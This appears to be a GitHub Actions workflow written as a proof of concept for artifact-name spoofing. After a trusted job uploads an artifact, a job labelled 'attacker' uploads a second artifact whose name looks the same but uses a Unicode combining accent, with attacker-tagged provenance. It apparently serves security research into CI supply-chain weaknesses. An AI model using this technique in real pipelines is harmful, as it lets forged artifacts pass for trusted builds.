name: Artifact Download Runtime Upload Source Impact

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  trusted:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare trusted payload
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p trusted-payload
          {
            echo "source=trusted-source-run"
            echo "artifact-name=artifact-download-impact-${GITHUB_RUN_ID}-release-é"
            echo "run-id=${GITHUB_RUN_ID}"
          } > trusted-payload/provenance.txt

      - name: Upload trusted artifact
        uses: actions/upload-artifact@v7
        with:
          name: artifact-download-impact-${{ github.run_id }}-release-é
          path: trusted-payload
          include-hidden-files: true

  attacker-runtime-upload:
    needs: trusted
    runs-on: ubuntu-latest
    steps:
      - name: Upload confusable artifact from ordinary runtime step
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p attacker-payload
          python3 - <<'PY'
          from pathlib import Path
          import os

          run_id = os.environ["GITHUB_RUN_ID"]
          name = f"artifact-download-impact-{run_id}-release-e\u0301"
          Path("attacker-payload/provenance.txt").write_text(
              (
                  "source=attacker-source-run\n"
                  "method=runtime-client-upload\n"
                  f"artifact-name={name}\n"
                  f"run-id={run_id}\n"
              ),
              encoding="utf-8",
          )
          Path("attacker-payload/padding.bin").write_bytes(b"A" * 4 * 1024 * 1024)
          PY

          npm init -y >/dev/null
          npm install @actions/artifact@6.2.1 >/dev/null
          node --input-type=module <<'NODE'
          import path from 'path'
          import {DefaultArtifactClient} from '@actions/artifact'

          const runId = process.env.GITHUB_RUN_ID
          const artifactName = `artifact-download-impact-${runId}-release-e\u0301`
          const root = path.resolve('attacker-payload')
          const files = [
            path.join(root, 'provenance.txt'),
            path.join(root, 'padding.bin')
          ]

          const client = new DefaultArtifactClient()
          const response = await client.uploadArtifact(
            artifactName,
            files,
            root,
            {compressionLevel: 0}
          )

          console.log(JSON.stringify({
            artifactName,
            artifactId: response.id,
            size: response.size,
            digest: response.digest
          }))
          NODE
